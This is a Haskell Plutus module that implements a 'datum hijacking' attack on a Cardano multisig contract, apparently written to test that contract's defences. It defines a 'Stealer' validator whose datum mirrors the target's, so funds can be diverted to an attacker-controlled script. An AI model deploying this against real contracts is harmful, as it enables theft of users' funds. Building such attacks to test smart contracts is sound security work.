{-# LANGUAGE DataKinds #-}
{-# LANGUAGE DeriveAnyClass #-}
{-# LANGUAGE DeriveGeneric #-}
{-# LANGUAGE DerivingStrategies #-}
{-# LANGUAGE MultiParamTypeClasses #-}
{-# LANGUAGE ScopedTypeVariables #-}
{-# LANGUAGE TemplateHaskell #-}
{-# LANGUAGE TypeApplications #-}
{-# LANGUAGE TypeFamilies #-}
{-# LANGUAGE NoImplicitPrelude #-}

-- | This module creates a simple "datum hijacking" example.
--  The "datum hijacking" attack consists in creating a contract
--  with a datum that is isomorphic to the one of the contract being attacked.
--  This means that if the script checks for an output containing, for example,
--  a datum @tgt = LegitimateDatum a b c@; that will get translated to checking
--  that some value @x@ of type @Data@ is such that @x == toBuiltinData tgt@.
--  Because @toBuiltinData@ yields identical representations to isomorphic datatypes,
--  it is possible to put an output of our own contract instead of a legitimate
--  output.
module PMultiSigStateful.DatumHijacking where

import Data.Aeson (FromJSON, ToJSON)
import GHC.Generics (Generic)
import qualified Ledger
import qualified Ledger.Contexts as Contexts
import qualified Ledger.Typed.Scripts as Scripts
import qualified PlutusTx
import PlutusTx.Prelude hiding (Applicative (..))
import Schema (ToSchema)
import qualified Prelude as Haskell

newtype StealerParams = StealerParams
  { stealerPKH :: Ledger.PubKeyHash
  }
  deriving stock (Haskell.Show, Generic)
  deriving anyclass (ToJSON, FromJSON, ToSchema)

PlutusTx.makeLift ''StealerParams

-- | Now we replicate the structure of the attacked contract's datum.
data StealerDatum
  = Accumulator {payment :: Payment, signees :: [Ledger.PubKey]}
  | Sign {signPk :: Ledger.PubKey, signSignature :: Ledger.Signature}
  deriving stock (Haskell.Show, Haskell.Eq, Generic)
  deriving anyclass (ToJSON, FromJSON)

data Payment = Payment
  { paymentAmount :: Integer,
    paymentRecipient :: Ledger.PubKeyHash
  }
  deriving stock (Haskell.Show, Haskell.Eq, Generic)
  deriving anyclass (ToJSON, FromJSON)

PlutusTx.makeLift ''Payment
PlutusTx.unstableMakeIsData ''Payment

type StealerRedeemer = ()

-- | The validation is trivial; make sure only the selaker can redeem the value later.
validateSteal :: StealerParams -> StealerDatum -> StealerRedeemer -> Contexts.ScriptContext -> Bool
validateSteal (StealerParams pkh) _ _ context =
  let info = Contexts.scriptContextTxInfo context
   in elem pkh (Contexts.txInfoSignatories info)

data Stealer

PlutusTx.makeLift ''StealerDatum
PlutusTx.unstableMakeIsData ''StealerDatum

instance Scripts.ValidatorTypes Stealer where
  type RedeemerType Stealer = StealerRedeemer
  type DatumType Stealer = StealerDatum

stealerValidator :: StealerParams -> Scripts.TypedValidator Stealer
stealerValidator =
  Scripts.mkTypedValidatorParam @Stealer
    $$(PlutusTx.compile [||validateSteal||])
    $$(PlutusTx.compile [||wrap||])
  where
    wrap = Scripts.wrapValidator @StealerDatum @StealerRedeemer
